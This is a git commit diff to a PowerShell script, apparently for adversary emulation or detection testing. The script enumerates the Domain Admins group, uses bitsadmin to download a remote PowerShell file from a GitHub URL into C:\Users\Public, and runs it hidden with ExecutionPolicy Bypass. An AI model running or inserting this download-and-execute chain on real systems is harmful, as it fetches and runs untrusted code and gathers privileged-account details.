4a746cdcb4f72866211573c2d34d3bd9571e5ed4
apmunch <andrew.munchbach@crowdstrike.com>
2019-05-30 14:44:18 -0400

    Update 1.ps1

--- 1.ps1
+++ 1.ps1
@@ -4,6 +4,6 @@ cmd.exe /c "ping -n 1 8.8.8.8"
 Start-Sleep -s 2
 cmd.exe /c "net group "Domain Admins" /domain
 Start-Sleep -s 2
-cmd.exe /c "bitsadmin /transfer debjob /download /priority normal https://bit.ly/2VueQiV C:\Users\Public\1.ps1"
+cmd.exe /c "bitsadmin /transfer debjob /download /priority normal https://raw.githubusercontent.com/apmunch/automate/master/custom_program.ps1 C:\Users\Public\1.ps1"
 Start-Sleep -s 2
 cmd.exe /c "powershell -windowStyle Hidden -ExecutionPolicy Bypass C:\Users\Public\1.ps1; Run-Program -GetStuff"
